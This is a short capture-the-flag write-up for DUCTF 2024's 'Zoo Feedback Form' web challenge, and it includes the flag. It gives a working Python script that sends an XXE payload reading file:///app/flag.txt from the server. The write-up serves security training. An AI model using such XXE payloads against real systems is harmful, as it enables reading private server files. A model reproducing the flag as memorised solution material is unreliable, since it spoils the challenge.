# Zoo Feedback Form
Solved by **aan**

## Question
The zoo wants your feedback! Simply fill in the form, and send away, we'll handle it from there!

## Solution
The application was vulnerable to the XXE injection, need to find where `flag.txt` is located.
```
import requests

url = "https://web-zoo-feedback-form-2af9cc09a15e.2024.ductf.dev/"

data = '''<?xml version="1.0"?>
<!DOCTYPE root [
  <!ELEMENT root ANY >
  <!ENTITY xxe SYSTEM "file:///app/flag.txt" >]>
<root>
  <feedback>&xxe;</feedback>
</root>'''

response = requests.post(url, data=data)

print(response.text)
```

### Flag
`DUCTF{emU_say$_he!!0_h0!@_ci@0}`
